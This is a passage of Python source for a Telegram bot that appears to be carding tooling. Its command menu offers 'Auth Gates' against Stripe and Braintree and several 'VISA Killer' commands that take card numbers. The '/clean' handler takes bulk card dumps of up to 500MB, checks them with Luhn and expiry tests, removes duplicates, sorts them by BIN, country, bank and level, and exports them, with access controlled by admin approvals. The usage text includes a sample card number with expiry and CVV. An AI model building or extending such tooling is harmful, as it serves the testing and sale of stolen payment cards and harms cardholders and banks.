            opts.add_argument("user-agent=Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120 Safari/537.36")

            svc = Service(executable_path=CHROME_DRIVER_PATH)
            drv = webdriver.Chrome(service=svc, options=opts)
            try:
                drv.set_page_load_timeout(10)
                drv.get("https://example.com")
                _ = drv.title
            finally:
                try:
                    drv.quit()
                except Exception:
                    pass

            return {"ok": True, "ms": int((_t.time() - t_start) * 1000), "err": None}
        except Exception as e:
            return {"ok": False, "ms": int((_t.time() - t_start) * 1000), "err": str(e)[:160]}
        finally:
            if acquired:
                try:
                    _browser_semaphore.release()
                except Exception:
                    pass

    now_ts = time.time()
    should_run = force or (now_ts - float(_last_selenium_health.get("ts", 0.0)) > 120.0)
    if should_run and chrome_ok and driver_ok:
        sel = await loop.run_in_executor(_executor, _selenium_smoke)
        _last_selenium_health = {"ts": now_ts, **sel}

    sel_ok = bool(_last_selenium_health.get("ok"))
    sel_ms = _last_selenium_health.get("ms")
    sel_err = _last_selenium_health.get("err")
    sel_age = int(now_ts - float(_last_selenium_health.get("ts", now_ts)))

    # --- Historical command health (usage stats) ---
    health_data = get_all_health()
    uptime = format_timedelta(datetime.now() - start_time)

    # Browser slots real-time
    try:
        slots_free = int(getattr(_browser_semaphore, "_value", -1))
    except Exception:
        slots_free = -1

    lines = [
        "🏥 *Health (Real-time)*",
        "━━━━━━━━━━━━━━━━━━━━━━",
        f"🤖 *Bot API:* {'✅ OK' if api_ok else '❌ FAIL'}" + (f" (`{api_ms}ms`)" if api_ms is not None else ""),
        f"🌐 *DNS:* {'✅ OK' if dns_ok else '❌ FAIL'} (`{dns_info}`)",
        f"🧠 *CPU:* `{cpu:.1f}%` | 💾 *RAM:* `{mem_used:.1f}%` | ⏱ *Uptime:* `{uptime}`",
        f"🧵 *Threads:* workers `{int(os.environ.get('WORKER_THREADS', '5'))}` | /site `{SITE_THREADS}` | browsers `{MAX_CONCURRENT_BROWSERS}` (free: `{slots_free}`)",
        "",
        "🧩 *Chrome:* " + ("✅" if chrome_ok else "❌") + f" `{chrome_ver}`",
        "🧩 *ChromeDriver:* " + ("✅" if driver_ok else "❌") + f" `{driver_ver}`",
        "🧪 *Selenium smoke:* "
        + ("✅" if sel_ok else "❌")
        + (f" (`{sel_ms}ms`)" if sel_ms is not None else "")
        + (f" | age `{sel_age}s`" if not force else " | forced"),
    ]
    if (not sel_ok) and sel_err:
        lines.append(f"   ⚠️ `{sel_err}`")
    if api_err and not api_ok:
        lines.append(f"   ⚠️ `{api_err}`")

    lines += [
        "",
        "📈 *Command Health (Usage Stats)*",
        "━━━━━━━━━━━━━━━━━━━━━━",
    ]

    overall_health = 0
    active_cmds = 0
    repairs_needed = []
    for cmd in BROWSER_CMDS:
        data = health_data[cmd]
        health = data["health"]
        bar = get_health_bar(health)
        if data["total"] > 0:
            overall_health += health
            active_cmds += 1
        if health < 30 and data["total"] > 0:
            repairs_needed.append(cmd)
        last = data.get("last_time") or "N/A"
        lines.append(f"`/{cmd}` {bar}  (`{data['success']}✓/{data['failure']}✗`, last: `{last}`)")

    avg_health = overall_health // active_cmds if active_cmds > 0 else 100
    lines.append("")
    lines.append(f"📊 *Overall (usage):* {get_health_bar(avg_health)}")
    if repairs_needed:
        lines.append(f"⚕️ *Auto-repair flagged:* `/{', /'.join(repairs_needed)}`")

    lines.append("")
    lines.append("🔧 *Admin:* `/health reset` | `/health deep` (force selenium)")

    await _tg_call_with_retry(
        status_msg.edit_text,
        "\n".join(lines),
        parse_mode="Markdown",
        disable_web_page_preview=True,
    )

async def bin_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_approved(uid, "bin"):
        await update.message.reply_text("⛔ You are not approved to use this command.", reply_to_message_id=update.message.message_id)
        return
    
    if not is_cmd_enabled("bin"):
        await update.message.reply_text("⚠️ This command is currently disabled by admin.", reply_to_message_id=update.message.message_id)
        return

    raw = " ".join(context.args) if context.args else ""
    if not raw and update.message.reply_to_message:
        raw = update.message.reply_to_message.text

    if not raw:
        await update.message.reply_text("⚠️ Usage: /bin <bins/cards/mixed text>", parse_mode="Markdown", reply_to_message_id=update.message.message_id)
        return

    # Extract all 6+ digit number sequences (max 30 bins)
    bin_candidates = set()
    for match in re.findall(r"\d{6,16}", raw):
        bin_candidates.add(match[:6])
        if len(bin_candidates) >= 30:  # Limit to 30 bins
            break

    if not bin_candidates:
        await update.message.reply_text("❌ No valid BINs or cards found.", parse_mode="Markdown", reply_to_message_id=update.message.message_id)
        return

    msg = "**🔍 BIN Lookup Results:**\n"
    for bin_ in sorted(bin_candidates):
        info, details = get_bin_info(bin_)
        
        # Format with country flag
        country = details.get('country', 'Unknown')
        country_flag = details.get('country_flag', '')
        bank = details.get('bank', 'Unknown')
        brand = details.get('brand', 'Unknown')
        type_ = details.get('type', 'Unknown')
        
        # FIXED: Format with clickable BIN number using monospace
        formatted_info = f"*BIN:* `{bin_}`\n"
        formatted_info += f"*Info:* {' • '.join(filter(None, [brand, type_, details.get('level','')]))}\n"
        formatted_info += f"*Bank:* {bank}\n"
        formatted_info += f"*Country:* {country_flag} {country}\n"
        
        msg += f"\n{formatted_info}"

    await update.message.reply_text(msg, parse_mode="Markdown", reply_to_message_id=update.message.message_id)

# ==== 4.6 Updated /cmds Command ====
async def cmds_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    isadm = is_admin(uid)

    def lock(line: str, cmd_key: Optional[str]) -> str:
        if cmd_key is None:
            return line  # public tool
        
        status_icon = "✅" if is_cmd_enabled(cmd_key) else "❌"
        approval_icon = "" if is_approved(uid, cmd_key) else "🔒"
        return f"{line} {status_icon}{approval_icon}"

    parts = []

    # Auth Gates
    parts.append("🔐 *Auth Gates*\n" + "\n".join([
        lock("/st <card> — Stripe Auth V1", "st"),
        lock("/bt <card> — Braintree Auth-1", "bt"),
        lock("/chk <card> — Braintree Auth-2 (Under Development)", "chk"),
    ]))

    # Visa Killer Gates
    parts.append("🗡️ *Visa Killer Gates*\n" + "\n".join([
        lock("/kill <card> — VISA Killer", "kill"),
        lock("/kd <card> — VISA Killer #2", "kd"),
        lock("/ko <card> — VISA Killer #3", "ko"),
        lock("/zz <card> — Killed v5 (fast)", "zz"),
        lock("/dd <card> — Killed v6 (ultra-fast)", "dd"),
    ]))

    # Data Processing Tools
    parts.append("🔧 *Data Processing Tools*\n" + "\n".join([
        lock("/filter <data|file|URL> — Fast card filter", "filter"),
        lock("/clean <data|file|URL> — Advanced cleaner", "clean"),
        lock("/sort <data|file|URL> — Clean & sort cards", "sort"),
        lock("/bin <bins/cards/mixed> — BIN lookup", "bin"),
        "/split [size\\_mb] — Split large files (reply to file)",
        "/merge — Merge multiple files into one (sorted, clean)",
    ]))

    # Details Fetching Tools
    parts.append("🔍 *Details Fetching Tools*\n" + "\n".join([
        lock("/site <url> — Analyze website gateway/captcha", "site"),
        "/jork <url> — Video downloader",
    ]))

    # Basic Tools
    parts.append("🧰 *Basic Tools*\n" + "\n".join([
        "/start — Welcome message",
        "/help — How to use the bot",
        "/cmds — Show command list",
        "/id — Show your Telegram ID",
        "/status — Show bot status",
        "/version — Bot version info",
    ]))

    if isadm:
        parts.append("🛠️ *Admin Commands*\n" + "\n".join([
            "/approve <id> <cmd|all> — Approve access",
            "/unapprove <id> <cmd|all> — Revoke access",
            "/remove <id> — Remove user (all approvals)",
            "/ban <id> — Ban user",
            "/unban <id> — Unban user",
            "/on <cmd> — Enable command",
            "/off <cmd> — Disable command",
            "/health — Browser commands health",
            "/ram — Show RAM/CPU/Disk details",
            "/cleanram [kill] — Best-effort memory cleanup",
            "/backup — Zip & send .py/.json files",
            "/log [lines] — Send recent container logs",
            "/broadcast <msg> — Broadcast message to users",
            f"\n✅ Approved (global): {len(approved_all)}",
        ]))

    # Footer note for locked cmds
    locked_cmds = [cmd for cmd in CMD_KEYS if not is_approved(uid, cmd)]
    if locked_cmds:
        parts.append("🔒 _Locked items require admin approval._")
    
    # Legend
    parts.append("📝 *Legend:* ✅ = Enabled, ❌ = Disabled, 🔒 = Requires approval")

    text = "📋 *Command List*\n\n" + "\n\n".join(parts)
    await update.message.reply_text(text, parse_mode="Markdown", reply_to_message_id=update.message.message_id)

# ==== 4.7 /clean Command (Fixed) ====
async def clean_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    uname = update.effective_user.first_name or "User"
    username = update.effective_user.username or uname
    
    if not is_approved(uid, "clean"):
        await update.message.reply_text("⛔ You are not approved to use this command.", reply_to_message_id=update.message.message_id)
        return
    
    if not is_cmd_enabled("clean"):
        await update.message.reply_text("⚠️ This command is currently disabled by admin.", reply_to_message_id=update.message.message_id)
        return
    
    data_text = ""
    file_size_mb = 0
    processing_msg = None
    
    # Check if message is a reply
    if update.message.reply_to_message:
        replied_msg = update.message.reply_to_message
        
        # Check for document attachment
        if replied_msg.document:
            file_size = replied_msg.document.file_size
            file_size_mb = file_size / (1024 * 1024)
            
            processing_msg = await update.message.reply_text(
                f"📥 Downloading file ({file_size_mb:.1f}MB)...", 
                reply_to_message_id=update.message.message_id
            )
            try:
                # For files > 20MB, use Pyrogram to download
                if file_size > 20 * 1024 * 1024:
                    if _pyrogram_available and _get_pyrogram_config():
                        await processing_msg.edit_text(
                            f"📥 Downloading large file ({file_size_mb:.1f}MB) via MTProto...\n\n"
                            f"<i>This may take a moment...</i>",
                            parse_mode="HTML"
                        )
                        file_bytes = await download_large_file_pyrogram(
                            replied_msg.document.file_id,
                            file_size
                        )
                        if file_bytes:
                            for encoding in ['utf-8', 'latin-1', 'cp1252', 'iso-8859-1']:
                                try:
                                    data_text = file_bytes.decode(encoding)
                                    break
                                except UnicodeDecodeError:
                                    continue
                            else:
                                data_text = file_bytes.decode('utf-8', errors='ignore')
                            
                            if not data_text or not data_text.strip():
                                await processing_msg.edit_text("❌ File is empty or could not be read.")
                                return
                            await processing_msg.edit_text(f"🔍 Processing {file_size_mb:.1f}MB...")
                        else:
                            await processing_msg.edit_text(
                                f"❌ Failed to download large file.\n\n"
                                "🌐 *Alternative - use URL:*\n"
                                "1. Upload to: transfer.sh, file.io, catbox.moe\n"
                                "2. Use: `/clean <URL>`",
                                parse_mode="Markdown"
                            )
                            return
                    else:
                        await processing_msg.edit_text(
                            f"⚠️ File too large: {file_size_mb:.1f}MB\n\n"
                            "💡 *Large file support requires API_ID & API_HASH*\n\n"
                            "🌐 *Or use URL method:*\n"
                            "1. Upload to: transfer.sh, file.io, catbox.moe\n"
                            "2. Use: `/clean <URL>`",
                            parse_mode="Markdown"
                        )
                        return
                else:
                    file = await context.bot.get_file(replied_msg.document.file_id)
                    data_text = await download_file_content(file)
                
                if not data_text or not data_text.strip():
                    await processing_msg.edit_text("❌ File is empty or could not be read.")
                    return
                    
                await processing_msg.edit_text(f"🔍 Processing {file_size_mb:.1f}MB...")
            except Exception as e:
                error_msg = str(e)
                if "too big" in error_msg.lower():
                    await processing_msg.edit_text(
                        "⚠️ File too large for Telegram Bot API.\n\n"
                        "💡 Set API_ID & API_HASH for large file support,\n"
                        "or use `/clean <URL>` with a file host.",
                        parse_mode="Markdown"
                    )
                else:
                    await processing_msg.edit_text(f"❌ Error: {error_msg[:100]}")
                return
        else:
            # Get text from replied message
            data_text = replied_msg.text or replied_msg.caption or ""
    else:
        # Get text from command arguments
        args_text = " ".join(context.args) if context.args else ""
        
        # Check if argument is a URL for large file download
        if args_text and is_valid_file_url(args_text.strip()):
            url = args_text.strip()
            processing_msg = await update.message.reply_text(
                f"🌐 Downloading from URL...\n`{url[:60]}...`" if len(url) > 60 else f"🌐 Downloading from URL...\n`{url}`",
                parse_mode="Markdown",
                reply_to_message_id=update.message.message_id
            )
            
            async def update_progress(percent, mb_downloaded):
                try:
                    await processing_msg.edit_text(
                        f"🌐 Downloading... {percent:.0f}%\n"
                        f"📥 {mb_downloaded:.1f}MB downloaded"
                    )
                except:
                    pass
            
            data_text, file_size_mb, error = await download_large_file_from_url(url, update_progress)
            
            if error:
                await processing_msg.edit_text(f"❌ Download failed: {error}")
                return
            
            if not data_text or not data_text.strip():
                await processing_msg.edit_text("❌ Downloaded file is empty or could not be read.")
                return
            
            await processing_msg.edit_text(f"🔍 Processing {file_size_mb:.1f}MB from URL...")
        else:
            data_text = args_text
    
    if not data_text or not data_text.strip():
        usage_text = (
            "🧹 Advanced Card Cleaner\n\n"
            "📝 Usage:\n"
            "• /clean <messy_data> - Clean & organize cards\n"
            "• /clean <URL> - Clean from URL (up to 500MB!) 🆕\n"
            "• Reply to a message with /clean\n"
            "• Reply to a file with /clean\n\n"
            "🌐 Large Files (100-500MB):\n"
            "Upload to transfer.sh, file.io, catbox.moe, pastebin, dropbox, etc.\n"
            "Then use: /clean <direct_download_URL>\n\n"
            "⚡ Features:\n"
            "• Ultra-fast streaming processing\n"
            "• Luhn validation & expiry check\n"
            "• BIN lookup (lazy-loaded)\n"
            "• Interactive filters\n"
            "• Multi-category export\n\n"
            "📁 Telegram file limit: 20MB | URL limit: 500MB\n\n"
            "Example:\n"
            "/clean 4403932640339759 03/27 401"
        )
        await update.message.reply_text(usage_text, reply_to_message_id=update.message.message_id)
        return
    
    # Start processing
    start_time_processing = time.time()
    status_msg = await update.message.reply_text("🧹 Cleaning and organizing data... This may take a moment.", reply_to_message_id=update.message.message_id)
    
    try:
        # Extract and organize cards
        organized_data, stats = extract_and_clean_cards_advanced(data_text)
        total_found = stats['valid']
        
        processing_time = time.time() - start_time_processing
        
        if total_found == 0:
            await status_msg.edit_text(
                f"❌ No valid cards found.\n"
                f"📄 Raw matches: {stats['total_raw']}\n"
                f"🗑️ Junk removed: {stats['junk']}\n"
                f"⏰ Expired removed: {stats['expired']}\n"
                f"♻️ Duplicates removed: {stats['duplicates']}"
            )
            return
        
        # Generate session ID (shorter)
        session_id = f"c_{uid}_{int(time.time()) % 10000}"
        
        # Store organized data in context
        context.user_data[session_id] = {
            'organized': organized_data,
            'stats': stats,
            'user_id': uid,
            'username': username,
            'timestamp': time.time(),
            'session_id': session_id,
            'processing_time': processing_time
        }
        
        # Clean old sessions (older than 2 hours)
        for key in list(context.user_data.keys()):
            if key.startswith("c_"):
                session_data = context.user_data[key]
                if time.time() - session_data.get('timestamp', 0) > 7200:  # 2 hours
                    del context.user_data[key]
        
        # Prepare main message with PLAIN TEXT (no Markdown)
        stats_text = (
            f"🧹 Cleaning Results\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"📊 Statistics\n"
            f"• Total Valid Cards: {total_found:,}\n"
            f"• Raw Matches Found: {stats['total_raw']:,}\n"
            f"• Junk Removed: {stats['junk']:,}\n"
            f"• Expired Removed: {stats['expired']:,}\n"
            f"• Duplicates Removed: {stats['duplicates']:,}\n"
            f"• Unique BINs: {stats['bins_found']:,}\n\n"
            f"⏱ Processing: {processing_time:.2f}s\n"
            f"📋 Session: {session_id}\n"
            f"👤 User: {username}\n\n"
            f"📁 Select a category:"
        )
        
        # Create category buttons - 2 buttons per row (OPTIMIZED)
        keyboard = []
        
        # Row 1: BINs and Expiry (fast categories)
        keyboard.append([
            InlineKeyboardButton(f"🔢 BINs ({stats['bins_found']})", callback_data=f"c_cat:b:0:{session_id}"),
            InlineKeyboardButton(f"📅 Expiry ({stats['years_found']} yrs)", callback_data=f"c_cat:e:0:{session_id}")
        ])
        
        # Row 2: Countries and Types (lazy-load)
        keyboard.append([
            InlineKeyboardButton("🌍 Countries", callback_data=f"c_cat:co:0:{session_id}"),
            InlineKeyboardButton("💳 Types", callback_data=f"c_cat:t:0:{session_id}")
        ])
        
        # Row 3: Levels and Brands (lazy-load)
        keyboard.append([
            InlineKeyboardButton("⭐ Levels", callback_data=f"c_cat:l:0:{session_id}"),
            InlineKeyboardButton("🏦 Brands", callback_data=f"c_cat:br:0:{session_id}")
        ])
        
        # Row 4: All Cards and Clear
        keyboard.append([
            InlineKeyboardButton(f"📋 All Cards ({total_found})", callback_data=f"c_cat:a:0:{session_id}"),
            InlineKeyboardButton("🗑️ Clear", callback_data=f"c_clr:{session_id}")
        ])
        
        # Row 5 - Bin Search Button
        keyboard.append([
            InlineKeyboardButton("🔍 Search BIN", callback_data=f"c_bin_search:{session_id}")
        ])
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await status_msg.edit_text(stats_text, reply_markup=reply_markup)
        
    except Exception as e:
        error_trace = traceback.format_exc()
        print(f"Clean error: {error_trace}")
        error_msg = f"❌ Error processing data: {str(e)[:100]}"
        await status_msg.edit_text(error_msg)
        
        # Send full error to admin
        if uid != BOT_ADMIN_ID:
            try:
                await context.bot.send_message(
                    BOT_ADMIN_ID,
                    f"❌ Clean error from user {uid}:\n{error_trace[:1000]}"
                )
            except:
                pass

# ==== 4.8 Clean Callback Handler (FIXED Year-Month Navigation) ====
async def clean_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle clean command callbacks - FIXED with year-month navigation and bin search"""
    query = update.callback_query
    # FIXED: Add timeout handling for answer()
    try:
        await query.answer()
    except Exception:
        pass  # Ignore timeout errors when answering callbacks
    
    user_id = query.from_user.id
    data = query.data
    
    if not data:
        return
    
    # Handle bin search
    if data.startswith("c_bin_search:"):
        session_id = data.split(":")[1]
        if session_id not in context.user_data:
            await query.edit_message_text("❌ Session expired. Please run /clean again.")
            return
        
        # Store session_id in user_data for bin search
        context.user_data[f"bin_search_session_{user_id}"] = session_id
        
        keyboard = [
            [InlineKeyboardButton("⬅️ Back", callback_data=f"c_back:{session_id}")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            "🔍 *BIN Search*\n\n"
            "Please send a BIN number (first 6 digits of a card) to search for all cards with that BIN.\n\n"
            "Example: `411111` or `531462`",
            parse_mode="Markdown",
            reply_markup=reply_markup
        )
        return
    
    # Handle clear session
    if data.startswith("c_clr:"):
        session_id = data.split(":")[1]
        if session_id in context.user_data:
            del context.user_data[session_id]
        await query.edit_message_text("🗑️ Session cleared. Run /clean again to process new data.")
        return
    
    # Handle back to main menu
    elif data.startswith("c_back:"):
        session_id = data.split(":")[1]
        if session_id not in context.user_data:
            await query.edit_message_text("❌ Session expired. Please run /clean again.")
            return
        
        session_data = context.user_data[session_id]
        organized_data = session_data['organized']
        stats = session_data['stats']
        total_found = stats['valid']
        username = session_data['username']
        processing_time = session_data['processing_time']
        
        # Prepare main message with PLAIN TEXT
        stats_text = (
            f"🧹 Cleaning Results\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"📊 Statistics\n"
            f"• Total Valid Cards: {total_found:,}\n"
            f"• Raw Matches Found: {stats['total_raw']:,}\n"
            f"• Junk Removed: {stats['junk']:,}\n"
            f"• Expired Removed: {stats['expired']:,}\n"
            f"• Duplicates Removed: {stats['duplicates']:,}\n"
            f"• Unique BINs: {stats['bins_found']:,}\n\n"
            f"⏱ Processing: {processing_time:.2f}s\n"
            f"📋 Session: {session_id}\n"
            f"👤 User: {username}\n\n"
            f"📁 Select a category:"
        )
        
        # Create category buttons - 2 buttons per row
        keyboard = []
        
        # Row 1: BINs and Expiry (fast categories)
        keyboard.append([
            InlineKeyboardButton(f"🔢 BINs ({stats['bins_found']})", callback_data=f"c_cat:b:0:{session_id}"),
            InlineKeyboardButton(f"📅 Expiry ({stats['years_found']} yrs)", callback_data=f"c_cat:e:0:{session_id}")
        ])
        
        # Row 2: Countries and Types (lazy-load)
        keyboard.append([
            InlineKeyboardButton("🌍 Countries", callback_data=f"c_cat:co:0:{session_id}"),
            InlineKeyboardButton("💳 Types", callback_data=f"c_cat:t:0:{session_id}")
        ])
        
        # Row 3: Levels and Brands (lazy-load)
        keyboard.append([
            InlineKeyboardButton("⭐ Levels", callback_data=f"c_cat:l:0:{session_id}"),
            InlineKeyboardButton("🏦 Brands", callback_data=f"c_cat:br:0:{session_id}")
        ])
        
        # Row 4: All Cards and Clear
        keyboard.append([
            InlineKeyboardButton(f"📋 All Cards ({total_found})", callback_data=f"c_cat:a:0:{session_id}"),
            InlineKeyboardButton("🗑️ Clear", callback_data=f"c_clr:{session_id}")
        ])
        
        # Row 5 - Bin Search Button
        keyboard.append([
            InlineKeyboardButton("🔍 Search BIN", callback_data=f"c_bin_search:{session_id}")
        ])
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(stats_text, reply_markup=reply_markup)
        return
    
    # Handle category selection with pagination
    elif data.startswith("c_cat:"):
        parts = data.split(":")
        if len(parts) < 4:
            return
            
        category = parts[1]
        page = int(parts[2])
        session_id = parts[3]
        
        if session_id not in context.user_data:
            await query.edit_message_text("❌ Session expired. Please run /clean again.")
            return
        
        session_data = context.user_data[session_id]
        
        # Check authorization
        if session_data['user_id'] != user_id and not is_admin(user_id):
            await query.edit_message_text("❌ You are not authorized to view this session.")
            return
        
        organized_data = session_data['organized']
        stats = session_data['stats']
        
        if category == "b":
            await show_bin_category(query, organized_data, session_id, page)
        elif category == "co":
            # Lazy load BIN details if not loaded
            if not organized_data.get('_bin_info_loaded'):
                _load_clean_bin_details(organized_data, stats)
            await show_country_category(query, organized_data, session_id, page)
        elif category == "t":
            # Lazy load BIN details if not loaded
            if not organized_data.get('_bin_info_loaded'):
                _load_clean_bin_details(organized_data, stats)
            await show_type_category(query, organized_data, session_id, page)
        elif category == "l":
            # Lazy load BIN details if not loaded
            if not organized_data.get('_bin_info_loaded'):
                _load_clean_bin_details(organized_data, stats)
            await show_level_category(query, organized_data, session_id, page)
        elif category == "br":
            # Lazy load BIN details if not loaded
            if not organized_data.get('_bin_info_loaded'):
                _load_clean_bin_details(organized_data, stats)
            await show_brand_category(query, organized_data, session_id, page)
        elif category == "e":
            await show_expiry_category(query, organized_data, session_id, page)
        elif category == "a":
            await show_all_cards(query, organized_data, session_id)
        elif category == "bank":
            # Lazy load BIN details if not loaded
            if not organized_data.get('_bin_info_loaded'):
                _load_clean_bin_details(organized_data, stats)
            await show_bank_category(query, organized_data, session_id, page)
    
    # Handle subcategory selection (FIXED: Proper year-month handling)
    elif data.startswith("c_sub:"):
        parts = data.split(":")
        if len(parts) < 5:
            return
        
        category = parts[1]  # Main category (e, ey, ym, etc.)
        sub_type = parts[2]  # Sub type (t, v, ym)
        identifier = parts[3]  # Identifier (year, month, year_month)
        
        # FIXED: Extract session_id correctly based on sub_type
        # For year-month: c_sub:ym:ym:year:month:session_id (6 parts)
        # For others: c_sub:cat:sub:id:session_id (5 parts)
        if sub_type == "ym" and len(parts) >= 6:
            year = identifier
            month = parts[4]
            session_id = parts[5]
        else:
            session_id = parts[4]
            year = None
            month = None
        
        if not session_id or session_id not in context.user_data:
            await query.edit_message_text("❌ Session expired. Please run /clean again.")
            return
        
        session_data = context.user_data[session_id]
        
        # Check authorization
        if session_data['user_id'] != user_id and not is_admin(user_id):
            await query.edit_message_text("❌ You are not authorized to view this session.")
            return
        
        organized_data = session_data['organized']
        
        # Handle different subcategory types
        if sub_type == "t":
            # Text subcategory (country, type, level, brand, bank)
            if category == "b":
                await show_bin_details(query, organized_data, identifier, session_id)
            elif category == "co":
                await show_country_details(query, organized_data, identifier, session_id)
            elif category == "t":
                await show_type_details(query, organized_data, identifier, session_id)
            elif category == "l":
                await show_level_details(query, organized_data, identifier, session_id)
            elif category == "br":
                await show_brand_details(query, organized_data, identifier, session_id)
            elif category == "bank":
                await show_bank_details(query, organized_data, identifier, session_id)
        elif sub_type == "v":
            # Value subcategory (year, month)
            if category == "ey":
                await show_expiry_year_details(query, organized_data, identifier, session_id)
            elif category == "em":
                await show_expiry_month_details(query, organized_data, identifier, session_id)
        elif sub_type == "ym":
            # Year-month subcategory - already extracted above
            if year and month:
                await show_year_month_details(query, organized_data, year, month, session_id)
            else:
                await query.answer("❌ Invalid year-month format", show_alert=True)
    
    # Handle export requests (FIXED: Proper parsing for year-month) 
    elif data.startswith("c_exp:"):
        parts = data.split(":")
        if len(parts) < 5:
            return
        
        export_type = parts[1]  # 1 or 2
        category = parts[2]  # b, co, t, l, br, bank, ey, em, ym
        sub_type = parts[3]  # t, v, ym
        identifier = parts[4]  # value
        session_id = parts[5] if len(parts) > 5 else None
        
        # FIXED: Handle year-month export specially
        if sub_type == "ym" and category == "ym":
            # Format: c_exp:1:ym:ym:year:month:session_id
            if len(parts) >= 7:
                year = identifier
                month = parts[5]  # month is in position 5
                session_id = parts[6]  # session_id is in position 6
                
                if session_id not in context.user_data:
                    await query.edit_message_text("❌ Session expired. Please run /clean again.")
                    return
                
                session_data = context.user_data[session_id]
                
                # Check authorization
                if session_data['user_id'] != user_id and not is_admin(user_id):
                    await query.edit_message_text("❌ You are not authorized to view this session.")
                    return
                
                organized_data = session_data['organized']
                username = session_data['username']
                
                # Get cards for this year-month
                by_year_month = organized_data['by_year_month']
                cards = []
                try:
                    year_int = int(year)
                    if year_int in by_year_month and month in by_year_month[year_int]:
                        cards = by_year_month[year_int][month]
                except:
                    pass
                
                if not cards:
                    await query.answer("❌ No cards found for export", show_alert=True)
                    return
                
                # Prepare file content
                file_content = ""
                export_category_name = f"{year}_{month}"
                
                if export_type == "1":
                    file_content = "\n".join([card['formatted'] for card in cards])
                else:
                    month_names = {
                        "01": "January", "02": "February", "03": "March", "04": "April",
                        "05": "May", "06": "June", "07": "July", "08": "August",
                        "09": "September", "10": "October", "11": "November", "12": "December"
                    }
                    month_name = month_names.get(month, f"Month {month}")
                    file_content = f"CARDS FOR YEAR-MONTH: {year}-{month_name}\n"
                    file_content += f"Total: {len(cards)} cards\n"
                    file_content += f"Export time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
                    file_content += "="*50 + "\n\n"
                    
                    for card in cards:
                        brand = card.get('brand', '-')
                        country = card.get('country', '-')
                        bank = card.get('bank', '-')
                        file_content += f"{card['formatted']} | {brand} | {country} | {bank}\n"
                
                file_name = f"cards_{year}_{month}_{int(time.time())}.txt"
                caption = f"📁 {len(cards):,} cards (Year-Month: {year}-{month})\n👤 Exported by: {username}"
                
                # Send file - use smart sender for large files
                try:
                    file_bytes = file_content.encode('utf-8')
                    file_size_mb = len(file_bytes) / (1024 * 1024)
                    
                    success = await send_large_document(
                        bot=context.bot,
                        chat_id=query.message.chat.id,
                        content=file_bytes,
                        filename=file_name,
                        caption=caption
                    )
                    
                    if success:
                        await query.answer(f"✅ Exported {len(cards)} cards ({file_size_mb:.1f}MB)", show_alert=True)
                    else:
                        await query.answer(f"⚠️ File too large ({file_size_mb:.1f}MB). Set API_ID/API_HASH for large files.", show_alert=True)
                except Exception as e:
                    print(f"Export error: {e}")
                    await query.answer("❌ Error exporting file", show_alert=True)
                return
        
        # Regular export handling (non-year-month)
        if not session_id or session_id not in context.user_data:
            await query.edit_message_text("❌ Session expired. Please run /clean again.")
            return
        
        session_data = context.user_data[session_id]
        
        # Check authorization
        if session_data['user_id'] != user_id and not is_admin(user_id):
            await query.edit_message_text("❌ You are not authorized to view this session.")
            return
        
        organized_data = session_data['organized']
        username = session_data['username']
        
        # Get cards for export
        cards = []
        export_category_name = category
        
        if sub_type == "t":
            if category == "b":
                cards = organized_data['by_bin'].get(identifier, [])
                export_category_name = "bin"
            elif category == "co":
                cards = organized_data['by_country'].get(identifier, [])
                export_category_name = "country"
            elif category == "t":
                cards = organized_data['by_type'].get(identifier, [])
                export_category_name = "type"
            elif category == "l":
                cards = organized_data['by_level'].get(identifier, [])
                export_category_name = "level"
            elif category == "br":
                cards = organized_data['by_brand'].get(identifier, [])
                export_category_name = "brand"
            elif category == "bank":
                cards = organized_data['by_bank'].get(identifier, [])
                export_category_name = "bank"
            elif category == "a":
                # All cards export
                cards = organized_data.get('all_cards', organized_data.get('all', []))
                export_category_name = "all_cards"
        elif sub_type == "v":
            if category == "ey":
                try:
                    cards = organized_data['by_expiry_year'].get(int(identifier), [])
                except:
                    cards = []
                export_category_name = "expiry_year"
            elif category == "em":
                cards = organized_data['by_expiry_month'].get(identifier, [])
                export_category_name = "expiry_month"
        
        if not cards:
            await query.answer("❌ No cards found for export", show_alert=True)
            return
        
        # Prepare file content
        file_content = ""
        if export_type == "1":
            file_content = "\n".join([card['formatted'] for card in cards])
            file_name = f"{export_category_name}_{int(time.time())}.txt"
            caption = f"📁 {len(cards):,} cards ({export_category_name}: {identifier[:20]})\n👤 Exported by: {username}"
        else:
            file_content = f"CARDS FOR {export_category_name.upper()}: {identifier[:50]}\n"
            file_content += f"Total: {len(cards)} cards\n"
            file_content += f"Export time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
            file_content += "="*50 + "\n\n"
            
            for card in cards:
                brand = card.get('brand', '-')
                country = card.get('country', '-')
                bank = card.get('bank', '-')
                file_content += f"{card['formatted']} | {brand} | {country} | {bank}\n"
            
            file_name = f"{export_category_name}_{int(time.time())}.txt"
            caption = f"📁 {len(cards):,} cards with details ({export_category_name}: {identifier[:20]})\n👤 Exported by: {username}"
        
        # Send file - use smart sender for large files
        try:
            file_bytes = file_content.encode('utf-8')
            file_size_mb = len(file_bytes) / (1024 * 1024)
            
            success = await send_large_document(
                bot=context.bot,
                chat_id=query.message.chat.id,
                content=file_bytes,
                filename=file_name,
                caption=caption
            )
            
            if success:
                await query.answer(f"✅ Exported {len(cards)} cards ({file_size_mb:.1f}MB)", show_alert=True)
            else:
                await query.answer(f"⚠️ File too large ({file_size_mb:.1f}MB). Set API_ID/API_HASH for large files.", show_alert=True)
        except Exception as e:
            print(f"Export error: {e}")
            await query.answer("❌ Error exporting file", show_alert=True)

# ==== 4.9 Clean Category Display Functions ====
async def show_bin_category(query, organized_data, session_id, page=0):
    """Show BIN category with buttons and pagination"""
    by_bin = organized_data['by_bin']
    
    # Sort bins by count
